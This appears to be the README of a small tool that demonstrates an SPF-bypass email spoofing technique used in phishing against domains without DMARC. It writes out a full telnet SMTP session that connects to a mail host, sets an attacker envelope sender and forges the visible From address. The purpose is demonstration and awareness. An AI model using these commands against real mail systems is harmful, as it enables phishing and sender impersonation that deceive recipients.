# spf-bypass

This project automates and demonstrates SPF-bypass techniques utilised by phishers to abuse domains that haven't been secured by DMARC.

The executable itself simply provides an interactive console for implementing the below telnet commands that can be executed on any Windows or Linux machine.

    telnet uq-net-au.mail.protection.outlook.com 25

    helo attackerdomain.com

    mail from: sebastian.salla@attackerdomain.com

    rcpt to: sebastian.salla@target.com.au

    data

    from: "Salla, Sebastian" <Sebastian_Salla@spoofed.com>

    to: sebastian.salla@target.com.au

    subject: Presentation - Email Demo

    This is a test

    .
